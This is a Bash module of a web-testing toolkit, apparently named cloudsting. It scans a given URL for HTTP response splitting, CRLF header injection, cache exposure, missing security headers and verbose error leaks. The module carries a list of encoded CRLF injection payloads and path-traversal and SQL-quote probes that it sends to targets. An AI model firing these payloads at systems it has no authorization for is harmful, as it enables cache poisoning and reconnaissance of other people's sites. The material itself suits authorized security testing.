#!/usr/bin/env bash
# 60_resp_smuggle.sh — cloudsting module 60: the response that carries two
# Verbs: --probe | --headers | --split | --cache | --leak | --reflect
#        | --vectors | --params | --list | --status-tsv | --menu | --selftest
#        | --help
#
# Request smuggling puts two requests in one; response smuggling puts two
# responses in one. A CR LF in a header value, a header echoed from the
# request, or a proxy that trusts `Content-Length` while the origin trusts
# chunked all let an attacker append a second response to the first — and a
# cache in the middle hands it to the next visitor.
set -u
umask 077

unset CS_MOD_DIR

MODULE_ID="60_resp_smuggle"
MOD_NAME="Response Smuggling (a second response spliced into the first)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/resp_smuggle"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${RS_TIMEOUT:=10}"
: "${RS_FOLLOW:=0}"
: "${RS_MARKER:=cloudsting_rs}"
: "${RS_PARAM:=q}"
: "${RS_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/60}"

rs_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what makes a response splittable ─────────────────────────────
# The vectors are ordered by how often they work: a reflected value is the
# common case, a CR LF that survives encoding is the interesting one, and a
# proxy that hides the origin's length is the one nobody checks.
#   <id>\t<class>\t<shape>\t<what a hit means>
rs_vectors() {
    cat <<'VECTORS'
crlf-raw	header-inject	%0d%0aX-Injected:1	the server let a CR LF out of a parameter into the header block
crlf-body	header-inject	%0d%0a%0d%0a<p>cloudsting</p>	a body terminator reached the wire, so the rest is a second response
crlf-double	header-inject	%250d%250aX-Injected:1	double encoding survived one round of normalisation
lf-only	header-inject	%0aX-Injected:1	a bare LF was accepted as a line terminator
cr-only	header-inject	%0dX-Injected:1	a bare CR was accepted as a line terminator
unicode-crlf	encoding	%E5%98%8A%E5%98%8D	overlong/unicode CR LF that a filter did not normalise
utf16-crlf	encoding	%C0%8D%C0%8A	UTF-8 overflow form of CR LF
split-path	path	/a%0d%0aX-Injected:1	the path is copied into a header or a redirect unescaped
split-host	path	%0d%0aX-Injected:1	a Host header reaches the wire
inject-cl	smuggle-content-length	%0d%0aContent-Length:0	a second response can carry its own length
inject-te	smuggle-chunked	%0d%0aTransfer-Encoding:chunked	a chunked terminator can end the first response
VECTORS
}

# Parameters that end up in a header more often than people expect: a
# redirect, a language, a callback, a content type, a filename.
#   <name>\t<where it usually lands>
rs_params() {
    cat <<'PARAMS'
url	a Location: header
next	a Location: header
redirect	a Location: header
return	the body
lang	a Content-Language: header
locale	a Content-Language: header
callback	a Content-Type: header
format	a Content-Type: header
filename	a Content-Disposition: header
type	a Content-Type: header
name	the body and a log line
q	a reflected search term
PARAMS
}

# ── the verdicts ─────────────────────────────────────────────────
# The only honest proof is a second response: a status line that is not the
# first one, or a header the request never asked for appearing after the body.
#   rs_smuggle_verdict <n-status-lines> <n-injected-headers> <n-body-terminators>
rs_smuggle_verdict() {
    local nstat="$1" ninj="$2" nterm="$3"
    (( ninj > 0 )) && { printf 'injected-header'; return; }
    (( nstat > 1 )) && { printf 'second-response'; return; }
    (( nterm > 0 )) && { printf 'body-terminated'; return; }
    printf 'clean'
}

# Severity depends on where the splice landed. A header injection is bad; a
# second response that a shared cache would store for the next visitor is the
# vulnerability.
#   rs_severity <verdict> <cached?>
rs_severity() {
    local v="$1" cached="${2:-no}"
    case "$v" in
        second-response) [[ "$cached" == "yes" ]] && printf 'CRITICAL' || printf 'HIGH' ;;
        body-terminated) printf 'HIGH' ;;
        injected-header) printf 'MEDIUM' ;;
        *)               printf 'INFO' ;;
    esac
}

# Whether a cache would keep this response is what turns a bug into someone
# else's problem: a splittable response with `X-Cache: HIT` or a public
# `Cache-Control` is served to every subsequent visitor.
#   rs_cache_verdict <cache-control> <x-cache> [vary]
rs_cache_verdict() {
    local cc="$1" xc="$2" vary="${3:-}"
    case "${xc,,}" in
        hit*) printf 'already-cached'; return ;;
    esac
    case "${cc,,}" in
        *no-store*|*private*|*no-cache*) printf 'not-cacheable'; return ;;
        *max-age=[1-9]*|*s-maxage*|*public*) ;;
        *) printf 'unknown'; return ;;
    esac
    [[ -z "$vary" ]] && { printf 'cacheable-no-vary'; return; }
    printf 'cacheable'
}

# What a response leaks without any smuggling at all: a stack trace, a
# framework banner, a debug header. Cheap to check and always worth reporting.
#   rs_leak_class <file>
rs_leak_class() {
    local file="$1"
    [[ -s "$file" ]] || { printf 'empty'; return; }
    if grep -qaiE '(at [a-z0-9_]+\.[a-z0-9_]+\(|traceback|exception in thread|stack trace)' "$file" 2>/dev/null; then
        printf 'stack-trace'; return
    fi
    if grep -qaiE '(sql syntax|ORA-[0-9]{5}|postgresql.*error|mysql.*error|sequelize)' "$file" 2>/dev/null; then
        printf 'database-error'; return
    fi
    if grep -qaiE '(<title>[^<]*error[^<]*</title>|whitelabel error page)' "$file" 2>/dev/null; then
        printf 'framework-error'; return
    fi
    printf 'none'
}

# ── the reader ───────────────────────────────────────────────────
# A response is read raw for lines that look like a status line, because a
# body can legitimately contain any of this — the check is whether it appears
# where a header belongs.
#   rs_fetch <url> [extra-header]
#   -> code \x1f bytes \x1f body-path \x1f header-file
rs_fetch() {
    local url="$1" extra="${2:-}"
    local bodyf hdrf
    bodyf="$(mktemp "$CS_SCRATCH/rsb.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.rsb.$$"
    hdrf="$(mktemp "$CS_SCRATCH/rsh.XXXXXX")" 2>/dev/null || hdrf="$OUT_DIR/.rsh.$$"

    local -a args=(-sS -o "$bodyf" -D "$hdrf" -w '%{http_code}' -m "$RS_TIMEOUT" -A "$RS_UA")
    [ "$RS_FOLLOW" = "1" ] && args+=(-L)
    [[ -n "$extra" ]] && args+=(-H "$extra")

    local code
    code="$(curl "${args[@]}" "$url" 2>/dev/null || printf '000')"
    local bytes; bytes="$(wc -c < "$bodyf" 2>/dev/null | tr -d ' ')"
    printf '%s\037%s\037%s\037%s\n' "$code" "${bytes:-0}" "$bodyf" "$hdrf"
}

rs_header() {
    local file="$1" name="$2"
    [[ -f "$file" ]] || return 0
    grep -ai "^${name}:" "$file" 2>/dev/null | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r\n'
}

# Count the status lines. A header file from curl holds one `HTTP/1.1 NNN`
# per hop, so a smuggled second response shows up as an extra hop that the
# request never asked for.
rs_count_status() {
    local file="$1"
    [[ -f "$file" ]] || { printf '0'; return; }
    grep -acE '^HTTP/[0-9.]+ [0-9]{3}' "$file" 2>/dev/null || printf '0'
}

rs_count_injected() {
    local bodyf="$1" hdrf="$2"
    local n=0
    [[ -f "$bodyf" ]] && n="$(grep -acE '^X-Injected:' "$bodyf" 2>/dev/null || printf '0')"
    [[ -f "$hdrf" ]] && n=$((n + $(grep -aicE '^X-Injected:' "$hdrf" 2>/dev/null || printf '0')))
    printf '%s' "$n"
}

rs_count_terminators() {
    local bodyf="$1"
    [[ -f "$bodyf" ]] || { printf '0'; return; }
    grep -acE '^(HTTP/[0-9.]+ [0-9]{3}|Content-Length:|Transfer-Encoding:)' "$bodyf" 2>/dev/null || printf '0'
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <url>: the base line. What does the endpoint leak with no payload
# at all — that is the part a reader can fix today.
rs_cmd_probe() {
    local url="${1:-}"
    [[ -z "$url" ]] && { rs_log "usage: --probe <url>"; return 2; }
    cs_row TARGET "$url"
    local code bytes bodyf hdrf
    cs_split "$(rs_fetch "$url")" code bytes bodyf hdrf

    local nstat; nstat="$(rs_count_status "$hdrf")"
    local cc xc vary
    cc="$(rs_header "$hdrf" cache-control)"
    xc="$(rs_header "$hdrf" x-cache)"
    vary="$(rs_header "$hdrf" vary)"
    local cls; cls="$(rs_leak_class "$bodyf")"
    local cv; cv="$(rs_cache_verdict "$cc" "$xc" "$vary")"

    cs_row RESPONSE "code=$code" "bytes=$bytes" "status-lines=$nstat"
    cs_row CACHE "cache-control=${cc:-none}" "x-cache=${xc:-none}" "vary=${vary:-none}" "verdict=$cv"
    cs_row LEAK "$cls"
    cs_row SERVER "$(rs_header "$hdrf" server)" "$(rs_header "$hdrf" x-powered-by)"

    case "$cls" in
        stack-trace|database-error)
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "MEDIUM" "response-leak-$cls" \
                "the response body carries a $cls — internal structure handed to the client"
            ;;
    esac
    case "$cv" in
        cacheable-no-vary)
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "LOW" "cacheable-no-vary" \
                "the response is cacheable and carries no Vary — a shared cache serves it to anyone"
            ;;
    esac
    rm -f "$bodyf" "$hdrf"
    cs_row SUMMARY "code=$code leak=$cls cache=$cv"
    return 0
}

# --headers <url>: which security headers are missing. Fast, and the answer a
# reader can act on in one edit.
rs_cmd_headers() {
    local url="${1:-}"
    [[ -z "$url" ]] && { rs_log "usage: --headers <url>"; return 2; }
    cs_row TARGET "$url"
    local code bytes bodyf hdrf
    cs_split "$(rs_fetch "$url")" code bytes bodyf hdrf

    local -a want=(content-security-policy strict-transport-security x-content-type-options x-frame-options referrer-policy permissions-policy cache-control)
    local missing=0
    local h
    for h in "${want[@]}"; do
        local v; v="$(rs_header "$hdrf" "$h")"
        if [[ -z "$v" ]]; then
            missing=$((missing + 1))
            cs_row MISSING "$h" "not set"
        else
            cs_row PRESENT "$h" "${v:0:80}"
        fi
    done
    local leakfw xpb
    leakfw="$(rs_header "$hdrf" server)"
    xpb="$(rs_header "$hdrf" x-powered-by)"
    [[ -n "$xpb" ]] && cs_row BANNER "x-powered-by" "$xpb"
    [[ -n "$leakfw" ]] && cs_row BANNER "server" "$leakfw"

    (( missing > 0 )) && cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "LOW" "missing-security-headers" \
        "$missing of ${#want[@]} security headers unset — the browser has no instruction to refuse a splice"
    rm -f "$bodyf" "$hdrf"
    cs_row SUMMARY "missing=$missing of ${#want[@]}"
    return 0
}

# --split <url> [param]: send each CR LF vector in one parameter and look for
# the second response.
rs_cmd_split() {
    local url="${1:-}" param="${2:-$RS_PARAM}"
    [[ -z "$url" ]] && { rs_log "usage: --split <url> [param]"; return 2; }
    cs_row TARGET "$url"
    cs_row PARAM "$param"

    # the control: the same parameter with a harmless value, so a server that
    # reflects everything is not mistaken for a splittable one
    local code bytes bodyf hdrf
    cs_split "$(rs_fetch "$(rs_with "$url" "$param" "$RS_MARKER")")" code bytes bodyf hdrf
    local ctrl_body=""; [[ -f "$bodyf" ]] && ctrl_body="$(cat "$bodyf")"
    local ctrl_inj; ctrl_inj="$(rs_count_injected "$bodyf" "$hdrf")"
    cs_row CONTROL "code=$code" "injected=$ctrl_inj"
    rm -f "$bodyf" "$hdrf"

    : > "$PROBE_FILE"
    local tried=0 hits=0
    local id cls shape what
    while IFS=$'\t' read -r id cls shape what; do
        [[ -z "$id" ]] && continue
        tried=$((tried + 1))
        local payload="${shape//%/$RS_MARKER}"
        # the shape carries the encoding verbatim; substitute only the marker
        payload="$(printf '%s' "$shape" | sed "s/%MARK%/$RS_MARKER/g")"
        local u; u="$(rs_with "$url" "$param" "$payload")"
        local rc rb rf rh
        cs_split "$(rs_fetch "$u")" rc rb rf rh
        local ninj nstat nterm
        ninj="$(rs_count_injected "$rf" "$rh")"
        nstat="$(rs_count_status "$rh")"
        nterm="$(rs_count_terminators "$rf")"
        local v; v="$(rs_smuggle_verdict "$nstat" "$ninj" "$nterm")"

        local cc xc vary cv
        cc="$(rs_header "$rh" cache-control)"; xc="$(rs_header "$rh" x-cache)"; vary="$(rs_header "$rh" vary)"
        cv="$(rs_cache_verdict "$cc" "$xc" "$vary")"
        local sev; sev="$(rs_severity "$v" "$( [[ "$cv" == already-cached || "$cv" == cacheable* ]] && echo yes || echo no)")"

        printf 'vector\t%s\t%s\t%s\t%s\t%s\t%s\n' "$id" "$rc" "$v" "$ninj" "$nstat" "$cv" >> "$PROBE_FILE"

        if [[ "$v" == "clean" ]]; then
            cs_row VECTOR "$id" "code=$rc" "clean"
        else
            hits=$((hits + 1))
            cs_row HIT "$id" "code=$rc" "verdict=$v" "inj=$ninj" "status=$nstat" "sev=$sev" "$what"
            printf '%s\t%s\t%s\t%s\n' "$id" "$v" "$cv" "$sev" >> "$HIT_FILE"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "resp-smuggle-$id" \
                "$id: $what (injected=$ninj status-lines=$nstat cache=$cv)"
        fi
        rm -f "$rf" "$rh"
    done < <(rs_vectors)

    local overall="clean"
    (( hits > 0 )) && overall="splittable"
    cs_row VERDICT "$overall" "$hits of $tried vectors spliced a second response"
    cs_row SUMMARY "vectors=$tried hits=$hits"
    cs_row ARTIFACT "$PROBE_FILE"
    return 0
}

# Build the URL with the parameter set. A value that already carries its own
# encoding is passed through; anything else is percent-encoded.
rs_with() {
    local url="$1" param="$2" value="$3"
    local sep="?"; [[ "$url" == *"?"* ]] && sep="&"
    printf '%s%s%s=%s' "$url" "$sep" "$param" "$value"
}

# --reflect <url> [param]: is anything echoed at all. This is the precondition
# for every other vector, and if it fails the rest of the module cannot fire.
rs_cmd_reflect() {
    local url="${1:-}" param="${2:-$RS_PARAM}"
    [[ -z "$url" ]] && { rs_log "usage: --reflect <url> [param]"; return 2; }
    cs_row TARGET "$url"
    cs_row PARAM "$param"

    local marker="rs$(date -u +%s)$$"
    local code bytes bodyf hdrf
    cs_split "$(rs_fetch "$(rs_with "$url" "$param" "$marker")")" code bytes bodyf hdrf
    local inbody="no" inheader="no"
    [[ -f "$bodyf" ]] && grep -qaF "$marker" "$bodyf" 2>/dev/null && inbody="yes"
    grep -qaF "$marker" "$hdrf" 2>/dev/null && inheader="yes"

    cs_row ECHO "code=$code" "body=$inbody" "header=$inheader"
    if [[ "$inheader" == "yes" ]]; then
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "param-into-header" \
            "$param reaches the response header block — a CR LF in the same value is a splice"
        cs_row VERDICT "header-reflection"
    elif [[ "$inbody" == "yes" ]]; then
        cs_row VERDICT "body-reflection"
    else
        cs_row VERDICT "not-reflected"
    fi
    rm -f "$bodyf" "$hdrf"
    cs_row SUMMARY "body=$inbody header=$inheader"
    return 0
}

# --cache <url>: would a shared cache keep this. A splittable response that a
# cache stores is served to everybody, which is the difference between a bug
# and an incident.
rs_cmd_cache() {
    local url="${1:-}"
    [[ -z "$url" ]] && { rs_log "usage: --cache <url>"; return 2; }
    cs_row TARGET "$url"
    local code bytes bodyf hdrf
    cs_split "$(rs_fetch "$url")" code bytes bodyf hdrf
    local cc xc vary age
    cc="$(rs_header "$hdrf" cache-control)"
    xc="$(rs_header "$hdrf" x-cache)"
    vary="$(rs_header "$hdrf" vary)"
    age="$(rs_header "$hdrf" age)"
    local v; v="$(rs_cache_verdict "$cc" "$xc" "$vary")"
    cs_row CACHE "cache-control=${cc:-none}" "x-cache=${xc:-none}" "vary=${vary:-none}" "age=${age:-none}"
    cs_row VERDICT "$v"
    case "$v" in
        already-cached)
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "cached-response" \
                "a shared cache already holds this response — substance here reaches other users"
            ;;
        cacheable-no-vary)
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "LOW" "cacheable-no-vary" \
                "cacheable without Vary — a cache serves it across users"
            ;;
    esac
    rm -f "$bodyf" "$hdrf"
    cs_row SUMMARY "cache=$v code=$code"
    return 0
}

# --leak <url>: what the error path says. Verbose errors are how internal
# names get out without any smuggling at all.
rs_cmd_leak() {
    local url="${1:-}"
    [[ -z "$url" ]] && { rs_log "usage: --leak <url>"; return 2; }
    cs_row TARGET "$url"

    local -a probes=("/%00" "/%2e%2e%2f" "/?id='" "/?id=1'" "/%ff" "/\\" "/..;/" "/?q=%")
    local p code bytes bodyf hdrf
    local found=0
    for p in "${probes[@]}"; do
        cs_split "$(rs_fetch "${url%/}$p")" code bytes bodyf hdrf
        local cls; cls="$(rs_leak_class "$bodyf")"
        cs_row PROBE "${url%/}$p" "code=$code" "bytes=$bytes" "leak=$cls"
        if [[ "$cls" != "none" && "$cls" != "empty" ]]; then
            found=$((found + 1))
            cs_findings_row "$MODULE_ID" "WEBAPI" "${url%/}$p" "MEDIUM" "verbose-error-$cls" \
                "a malformed request produced a $cls — the error path describes the internals"
        fi
        rm -f "$bodyf" "$hdrf"
    done
    cs_row VERDICT "$( (( found > 0 )) && echo leaky || echo quiet)" "$found of ${#probes[@]} probes leaked"
    cs_row SUMMARY "leaks=$found"
    return 0
}

rs_cmd_vectors() {
    local id cls shape what
    while IFS=$'\t' read -r id cls shape what; do
        [[ -z "$id" ]] && continue
        cs_row VECTOR "$id" "$cls" "$shape" "$what"
    done < <(rs_vectors)
    cs_row SUMMARY "vectors=$(rs_vectors | wc -l | tr -d ' ')"
    return 0
}

rs_cmd_params() {
    local n where
    while IFS=$'\t' read -r n where; do
        [[ -z "$n" ]] && continue
        cs_row PARAM "$n" "$where"
    done < <(rs_params)
    cs_row SUMMARY "params=$(rs_params | wc -l | tr -d ' ')"
    return 0
}

rs_cmd_list() { rs_cmd_vectors; }

rs_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    command -v jq   >/dev/null 2>&1 && jq_state="jq-ok"     || jq_state="jq-missing"
    printf '%s\t%s\t%s\t%s\tvectors-%s\tparams-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(rs_vectors | wc -l | tr -d ' ')" "$(rs_params | wc -l | tr -d ' ')"
}

rs_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

rs_cmd_help() {
    cat <<'HELP'
cloudsting module 60 — Response Smuggling v1.0.0
  --probe <url>                    leak, cache and header posture of one endpoint
  --reflect <url> [param]          is anything echoed, and into the header block
  --split <url> [param]            every CR LF vector, looking for a second response
  --cache <url>                    would a shared cache keep this
  --headers <url>                  which security headers are missing
  --leak <url>                     what the error path says about the internals
  --vectors | --params | --list
  --status-tsv | --menu | --selftest | --help

Request smuggling puts two requests in one; response smuggling puts two
responses in one. The proof is a second response — an extra status line, or a
header the request never asked for appearing after the body — never a 200 that
merely looks odd.

Where the splice lands decides the severity: a header injection is MEDIUM, a
second response is HIGH, and a second response a shared cache will store is
CRITICAL, because the next visitor to that URL receives it.

Environment: RS_TIMEOUT (10), RS_PARAM (q), RS_MARKER, RS_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
rs_selftest() {
    cs_selftest_reset

    local nv; nv="$(rs_vectors | wc -l | tr -d ' ')"
    chk vec-many   "$( (( nv >= 10 )) && echo many || echo few )" "many"
    chk vec-4col   "$(rs_vectors | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk vec-unique "$(rs_vectors | cut -f1 | sort -u | wc -l | tr -d ' ')" "$nv"
    chk vec-class  "$(rs_vectors | awk -F'\t' '$2 !~ /^(header-inject|encoding|path|smuggle-content-length|smuggle-chunked)$/{c++} END{print c+0}')" "0"
    local np; np="$(rs_params | wc -l | tr -d ' ')"
    chk par-many   "$( (( np >= 10 )) && echo many || echo few )" "many"
    chk par-2col   "$(rs_params | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"

    # verdict table
    chk v-clean    "$(rs_smuggle_verdict 1 0 0)" "clean"
    chk v-header   "$(rs_smuggle_verdict 1 2 0)" "injected-header"
    chk v-second   "$(rs_smuggle_verdict 2 0 0)" "second-response"
    chk v-term     "$(rs_smuggle_verdict 1 0 3)" "body-terminated"
    chk v-both     "$(rs_smuggle_verdict 2 1 0)" "injected-header"

    chk s-crit     "$(rs_severity second-response yes)" "CRITICAL"
    chk s-high     "$(rs_severity second-response no)"  "HIGH"
    chk s-med      "$(rs_severity injected-header no)"  "MEDIUM"
    chk s-info     "$(rs_severity clean no)"            "INFO"

    chk c-hit      "$(rs_cache_verdict '' 'HIT' '')"                "already-cached"
    chk c-nostore  "$(rs_cache_verdict 'no-store' '' '')"           "not-cacheable"
    chk c-private  "$(rs_cache_verdict 'private, max-age=0' '' '')" "not-cacheable"
    chk c-novary   "$(rs_cache_verdict 'public, max-age=60' '' '')" "cacheable-no-vary"
    chk c-vary     "$(rs_cache_verdict 'public, max-age=60' '' 'Accept')" "cacheable"
    chk c-unknown  "$(rs_cache_verdict '' '' '')"                   "unknown"

    # leak classification
    local f; f="$(mktemp "$CS_SCRATCH/rs-l.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.l.$$"
    printf 'Traceback (most recent call last):\n  File "x.py", line 1\n' > "$f"
    chk l-stack    "$(rs_leak_class "$f")" "stack-trace"
    printf 'error: sql syntax near SELECT\n' > "$f"
    chk l-db       "$(rs_leak_class "$f")" "database-error"
    printf '<title>Whitelabel Error Page</title>\n' > "$f"
    chk l-fw       "$(rs_leak_class "$f")" "framework-error"
    printf 'all good\n' > "$f"
    chk l-none     "$(rs_leak_class "$f")" "none"
    : > "$f"
    chk l-empty    "$(rs_leak_class "$f")" "empty"
    rm -f "$f"

    # header counting: a smuggled response is an extra status line
    local hf; hf="$(mktemp "$CS_SCRATCH/rs-h.XXXXXX")" 2>/dev/null || hf="$OUT_DIR/.h.$$"
    printf 'HTTP/1.1 200 OK\r\nX-A: 1\r\n\r\n' > "$hf"
    chk hs-one     "$(rs_count_status "$hf")" "1"
    printf 'HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 500 Error\r\n\r\n' > "$hf"
    chk hs-two     "$(rs_count_status "$hf")" "2"
    printf 'HTTP/2 200\r\n\r\n' > "$hf"
    chk hs-h2      "$(rs_count_status "$hf")" "1"
    rm -f "$hf"

    # the URL builder must not double-encode a vector that carries its own
    chk with-fresh "$(rs_with 'http://h/a' q 'x')" 'http://h/a?q=x'
    chk with-query "$(rs_with 'http://h/a?b=1' q 'x')" 'http://h/a?b=1&q=x'

    # a dead host is silent, never a splice
    local out; out="$(rs_cmd_split http://127.0.0.1:9 q 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "clean"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="HIT"' | wc -l | tr -d ' ')" "0"

    # usage errors, not crashes
    rs_cmd_probe 2>/dev/null;   chk prb-usage "$?" "2"
    rs_cmd_split 2>/dev/null;   chk spl-usage "$?" "2"
    rs_cmd_reflect 2>/dev/null; chk ref-usage "$?" "2"
    rs_cmd_cache 2>/dev/null;   chk cac-usage "$?" "2"
    rs_cmd_headers 2>/dev/null; chk hdr-usage "$?" "2"
    rs_cmd_leak 2>/dev/null;    chk lea-usage "$?" "2"

    # shape contracts
    chk status-fields "$(rs_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(rs_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(rs_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(rs_cmd_help | head -1 | grep -ci 'Response Smuggling')" "1"
    chk vec-rows      "$(rs_cmd_vectors | grep -c '^VECTOR')" "$nv"
    chk par-rows      "$(rs_cmd_params | grep -c '^PARAM')" "$np"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)   shift; rs_cmd_probe "$@";;
    --split)   shift; rs_cmd_split "$@";;
    --reflect) shift; rs_cmd_reflect "$@";;
    --cache)   shift; rs_cmd_cache "$@";;
    --headers) shift; rs_cmd_headers "$@";;
    --leak)    shift; rs_cmd_leak "$@";;
    --vectors) rs_cmd_vectors;;
    --params)  rs_cmd_params;;
    --list)    rs_cmd_list;;
    --status-tsv|--status) rs_cmd_status_tsv;;
    --menu)    rs_cmd_menu;;
    --selftest) rs_selftest;;
    *)         rs_cmd_help;;
esac
